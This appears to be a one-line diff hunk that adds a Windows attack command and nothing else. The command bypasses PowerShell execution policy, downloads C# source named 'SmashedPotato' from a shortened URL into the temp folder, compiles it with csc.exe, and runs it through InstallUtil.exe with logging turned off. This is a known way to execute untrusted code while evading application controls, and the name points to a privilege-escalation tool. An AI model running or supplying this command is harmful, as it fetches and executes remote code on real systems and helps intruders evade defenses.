@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://is.gd/y6cfKV','%temp%\SmashedPotato.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe  /out:"%temp%\SmashedPotatoX64.exe" /platform:x64 "%temp%\SmashedPotato.cs" && InstallUtil.exe /logfile= /LogToConsole=false /U %temp%\SmashedPotatoX64.exe
